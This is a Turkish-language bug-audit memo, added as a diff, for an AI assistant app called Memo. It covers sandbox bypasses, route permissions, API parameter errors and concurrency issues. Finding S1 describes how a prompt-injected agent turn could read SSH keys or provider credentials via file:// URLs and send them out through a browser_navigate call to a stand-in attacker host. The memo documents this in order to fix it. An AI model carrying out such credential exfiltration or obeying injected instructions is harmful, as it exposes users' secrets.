@@ -1,3 +1,70 @@
+# Memo — Genel Bug Taraması (2026-09-28)
+
+> **Kapsam:** 2026-09-14 denetiminden (aşağıda) bu yana eklenen/değişen kod öncelikli (65 Go dosyası, +4987 satır: prompt-cache muhasebesi, etkileşimli tarayıcı oturumu, görsel üretimi, per-chat stream kilitleri, Code Mode alt-modları) + tüm repo için mekanik taramalar.
+> **Yöntem:** tam doğrulama seti; `staticcheck` + `govulncheck` (`go run …@latest` — `~/go/bin`'deki `golangci-lint`/`govulncheck` Go 1.26 ile derlenmiş, sistem Go 1.27 olduğu için ikisi de çöküyor); AGENTS.md'nin bilinen hata sınıfları için repo çapında grep (ham `Exec`, sabit `data/` yolu, denetimsiz Dart `as List/Map`, Rule #8 L10n); değişen kodun satır satır okunması. Güvenlik bulguları gerçek Chromium / gerçek HTTP sunucusu ile kanıtlandı.
+
+## Temel durum (değişiklik öncesi)
+
+| Kontrol | Sonuç |
+|---|---|
+| `go build` / `go vet` (`-tags sqlite_fts5`) | temiz |
+| `go test ./... -race` | 54 paket yeşil |
+| `flutter analyze lib/ test/` | 7 bulgu, hepsi önceden bilinen info |
+| `flutter test` | 406/406 |
+| `govulncheck` | 0 zafiyet |
+| `staticcheck` | gerçek hata yok — 10× U1000 ölü kod, 20× ST1005 stil, 2× SA4006 kullanılmayan atama, `router.go:134` her zaman doğru nil kontrolü |
+| Rule #8 L10n grep (tüm `frontend/lib`) | yalnızca marka adları (`'WhatsApp'`, `'Telegram'`) |
+
+## Bulgular
+
+### S1 — ✅ Düzeltildi — Etkileşimli tarayıcı `file://` açıyordu: `read_file`'ın proje sandbox'ı tamamen atlanıyordu
+**Dosyalar:** `internal/browserengine/session.go` (`Navigate`), `internal/agent/tools/browser.go`, `internal/app/browser_session_manual.go`
+
+`Session.Navigate` URL'yi hiç doğrulamadan `chromedp.Navigate`'e veriyordu. Chromium `file://`'ı (dizin listeleri dahil) düz sayfa metni olarak render ediyor, yani `browser_navigate file:///…` + `browser_get_text` Memo sürecinin okuyabildiği her dosyayı okuyordu. `read_file` ise proje dizinine hapsedilmiş durumda ve korunan dosyaları reddediyor. `browser_navigate` **Medium** (izin diyaloğunda "bu oturum için izin ver" seçilebiliyor), `browser_get_text` **Safe**. Yani tek bir onaydan sonra, prompt injection'a maruz kalmış bir tur `~/.memo/data/providers.json` ya da `~/.ssh/*` okuyup sonraki bir `browser_navigate https://saldirgan/?q=…` ile dışarı sızdırabiliyordu.
+**Kanıt:** gerçek Chromium'la geçici bir test, `t.TempDir()` altındaki bir dosyayı `file://` ile açıp `PageText` üzerinden içeriğini birebir geri okudu.
+**Düzeltme:** `validateNavigateURL` artık yalnızca `http`/`https`'e (host zorunlu) ve `about:blank`'e izin veriyor. Hem ajan aracının hem BrowserPane URL çubuğunun geçtiği tek nokta burası. Şemasız giriş (`example.com`) bugün de zaten çalışmıyordu (Chromium "Cannot navigate to invalid URL" döndürüyor, canlı ölçüldü), yani bu değişiklik çalışan hiçbir şeyi bozmuyor.
+**Regresyon:** `TestValidateNavigateURL`, `TestSession_Navigate_RejectsFileURLBeforeTouchingChromium` (guard kaldırılınca kırmızı: `panic: cannot create context from nil parent`, yani çağrı Chromium'a kadar ulaşıyor).
+
+### S2 — ✅ Düzeltildi — `/api/browser/session/*` hiçbir izin kontrolü olmadan kayıtlıydı
+**Dosya:** `internal/webserver/server.go` (rota tablosu)
+
+Beş rota da çıplak `route(...)` ile kayıtlıydı. Aynı hassasiyetteki `/api/files/browse` ise `requirePermissionStrict` ile korunuyor. Uzak erişimde `Agent` izni kapalı kısıtlı bir hesap, sunucunun kendi tarayıcısını doğrudan sürebiliyordu. S1'den önce bu `file://` ile sunucunun dosya sistemini ekran görüntüsü olarak okumak demekti. S1'den sonra bile LAN'daki hostlara ve backend'in loopback'e güvenen kendi API'sine (`remoteAuthOK` loopback'i kimlik bilgisi istemeden geçiriyor), o hesabın normalde göremediği uç noktalar dahil (ör. `Memory` izni gerektiren `/api/memory/*` GET'leri), sunucu adına istek atılabiliyordu.
+**Düzeltme:** beş rota da `requirePermission(…, hasAgentPerm)` ile sarıldı. POST'lar kapalı; `status` (GET) ambient polling için açık kalıyor. Masaüstü ve hesapsız kurulumlar değişmedi (`callerHasPermission` fail-open).
+**Regresyon:** `TestBrowserSessionRoutes_GatedByAgentPermission` testi gerçek route tablosu üzerinden, gerçek HTTP ile koşuyor. Eski wiring'e karşı 5/5 rota `200` döndü ve bridge'in `NavigateBrowserSession`'ı çalıştı.
+
+### S3 — 🔴 Açık (karar gerekiyor) — Claude sağlayıcısı her istekte `temperature` gönderiyor → Opus 4.7+ / Sonnet 5 / Opus 5 / Fable'da her istek 400
+**Dosyalar:** `internal/provider/claude.go:760-761` (`buildClaudeRequest`), çağıranlar `internal/agent/pipeline.go:189` (`Temperature: 0.2`), `internal/app/llm.go:1264,1891` (`cfg.Llama.Temperature`)
+
+Anthropic dokümanına göre (claude-api skill, `shared/model-migration.md` "Migrating to Opus 4.7"): `temperature`/`top_p`/`top_k` Opus 4.7'den itibaren kaldırıldı ve **400 döndürüyor**. Aynı durum Opus 4.8/5/5.5, Sonnet 5 ve Fable 5/5.1 için de geçerli. `buildClaudeRequest` `req.Temperature`'ı koşulsuz kopyalıyor (`omitempty` yalnızca 0'ı atlıyor). Ajan hattı her zaman 0.2, sohbet hattı config'teki sıcaklığı gönderiyor. **Sonuç:** kullanıcı `ListModels`'ın canlı döndürdüğü güncel bir Claude modelini seçerse hem düz sohbet hem ajan modu her turda başarısız oluyor. Ajan turlarında ayrıca 400, cache_control retry valfini de tetikliyor, yani her başarısız tur iki istek harcıyor. UI'nin sunduğu `xhigh` efor seviyesi (`handlers_oauth.go`) tam olarak bu modellere özgü, yani özellik fiilen bu modeller için tasarlanmış.
+**Neden canlıda görülmedi:** `data/stats/usage.db`'de doğrudan Claude/OpenAI kaydı yok (yalnızca Kilo/Cline/Ollama/OpenCode). Hata hiç tetiklenmemiş, gizli duruyor. Varsayılan model (`claude-sonnet-4-20250514`) sıcaklığı kabul ediyor.
+**Seçenekler:** (a) model adına göre sampling alanlarını atlamak: kısa ama yeni model çıktıkça bakım istiyor; (b) `cache_control`/`include_usage` ile aynı retry-and-latch valfi: 400 gövdesinde `temperature`/`top_p` geçiyorsa alanları çıkarıp bir kez yeniden dene, provider instance'ında latch'le. Model listesi tutmadan her yeni modelde çalışır. Öneri (b), çünkü repo bu deseni zaten iki kez benimsemiş.
+**Aynı sınıf, doğrulanmadı:** OpenAI akıl yürütme modelleri (o-serisi, gpt-5) de benim bilgime göre `temperature≠1`'i ve `max_tokens`'ı (bunun yerine `max_completion_tokens`) reddediyor. `openai.go` ikisini de koşulsuz gönderiyor. Bu oturumda dokümandan teyit edilmedi.
+
+### S4 — 🟡 Açık, doğrulanmadı — Claude + düşünme + araç döngüsünde thinking blokları geri gönderilmiyor
+**Dosyalar:** `internal/provider/claude.go` (`ChatCompletion` `thinking` bloklarını yalnızca metin olarak topluyor, `signature`'ı atıyor; `buildClaudeRequest` asistan turunu yalnızca `text` + `tool_use` ile yeniden kuruyor)
+
+Efor seviyesi seçiliyken (`thinking: adaptive`) ya da düşünmenin varsayılan açık olduğu Opus 5'te, bir araç turunun asistan mesajı bir sonraki istekte thinking bloğu olmadan geri gönderiliyor. Anthropic dokümanı aynı modelde "thinking bloklarını değiştirmeden geri gönder" diyor. Bunun 400 mü ürettiği, yoksa yalnızca kalite/cache kaybı mı olduğu bu oturumda **teyit edilemedi**; skill dokümanı bu durumu açıkça kapsamıyor. S3 düzeltildikten sonra gerçek bir anahtarla bir ajan turunda test edilmeli.
+
+### S5 — 🟢 Açık, P3 — `GetStreamingChatIDs` her yoklamada gerçek kilitleri anlık tutuyor → nadiren sahte "lütfen bekleyin"
+**Dosya:** `internal/app/chat_locks.go` (`GetStreamingChatIDs`, `lockChatStream`)
+
+Kenar çubuğu her istemciden 2 sn'de bir `/api/chats/streaming`'i yokluyor (`chat_provider.dart:81-97`). Handler her sohbetin mutex'ini `TryLock()`+`Unlock()` ile yokluyor. `lockChatStream` ise `cl.TryLock()`'u `chatStreamMu` dışında çağırıyor. Yoklamanın kilidi tuttuğu anda gelen gerçek bir gönderim `busyNotice` alıyor. Pencere nanosaniye mertebesinde, olasılık düşük. Düzeltme: kilit/serbest bırakma sırasında ayrı bir `inFlight` sayacı/set'i güncellemek ve yoklamada onu okumak.
+
+### S6 — 🟢 Açık, P3 (sağlamlaştırma) — `openai.go processSSE`: boş string `finish_reason` sahte "bitti" gibi işleniyor
+**Dosya:** `internal/provider/openai.go:587-600`
+
+`FinishReason != nil` kontrolü `"finish_reason": ""` gönderen bir sunucuyu bitmiş sayıyor: `pendingFinish = ""`, 2 sn'lik watchdog kuruluyor, her sonraki chunk öncekini durdurmadan yeni bir timer kuruyor. İlk timer ateşlenince body kapanıyor, `pendingFinish` boş olduğu için tur **hata** ile bitiyor. Bunu yapan bir sunucu bilmiyorum, doğrulanmadı. Tek satırlık koruma: `*FinishReason == ""` değerini yok sayılmış gibi ele almak.
+
+### S7 — 🟢 P3 — Küçük notlar
+- `internal/websearch/fetch.go`: getirilen her sayfanın **tam içeriği** Info seviyesinde loglanıyor (yorumda "geçici debug" olarak işaretli). Log boyutu ve gizlilik açısından bir debug bayrağına alınmalı.
+- `internal/browserengine/data/browsersession/`'da eski test koşularından 14 öksüz profil dizini var (gitignore'lu). Üretim veri dizininde (`data/browsersession/`) ise yok, yani üretimde `close()` temizliği çalışıyor.
+- `staticcheck` ölü kod listesi: `startWebServerForRemote`, `findPath`, `pidOnPort`, `geminiProvider.setAuth`, `authHeader`, `generateSelfSignedCert`, `config.once`, `database.defaultDriver`.
+
+## Temiz bulunanlar (bu turda kontrol edildi)
+`openai.go`/`claude.go` retry-and-latch valfleri (400/422 tetikleyicisi, orijinal hatanın raporlanması, latch'in yalnızca başarılı retry'da kurulması) · Claude/OpenAI akışında usage'ın terminal chunk'a taşınması ve Done gelmeden kanal kapanınca `llm.go`'nun boş yanıt/hata dalı · `imagegen.go` (boş `Images` provider'da reddediliyor) · `chat_locks.go`'nun `runLockedStreamSetup` panic/release deseni · `ListRemoteDevices` (boş listede `[]`, `null` değil) · ham `ExecContext` çağrıları (yalnızca şema kurulumu ve kendi `MaxPool:1` bağlantısını kullanan calendar store) · `sessions.go`'nun yeni alanları.
+
+---
+
 # Memo — Derin Kod-Kanıtlı Bug Denetimi (codebase-memory ile)
 
 > **Denetim tarihi:** 2026-09-14
